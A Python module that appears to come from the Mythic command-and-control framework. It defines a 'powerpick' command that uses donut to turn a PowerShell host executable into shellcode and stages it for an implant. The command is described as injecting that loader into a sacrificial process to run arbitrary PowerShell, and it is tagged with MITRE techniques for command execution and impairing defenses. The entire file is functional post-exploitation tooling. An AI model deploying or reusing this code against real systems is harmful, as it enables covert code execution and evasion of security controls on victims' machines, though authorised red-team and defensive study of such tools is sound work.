from mythic_payloadtype_container.MythicCommandBase import *
import json
from sRDI import ShellcodeRDI
from uuid import uuid4
from mythic_payloadtype_container.MythicRPC import *
from os import path
import donut
class PowerpickArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "powershell_params": CommandParameter(name="Command", type=ParameterType.String, description="PowerShell command to execute.", required=True),
        }

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise Exception("A command must be passed on the command line to PowerPick.\n\tUsage: {}".format(PowerpickCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("powershell_params", self.command_line)
        self.add_arg("pipe_name", str(uuid4()))
        pass


class PowerpickCommand(CommandBase):
    cmd = "powerpick"
    needs_admin = False
    help_cmd = "powerpick [command]"
    description = "Inject PowerShell loader assembly into a sacrificial process and execute [command]."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PowerpickArguments
    attackmapping = ["T1059", "T1562"]
    
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        exePath = "/srv/PowerShellHost.exe"
        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(donutPic).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)

        task.display_params = task.args.get_arg("powershell_params")
        return task

    async def process_response(self, response: AgentResponse):
        pass
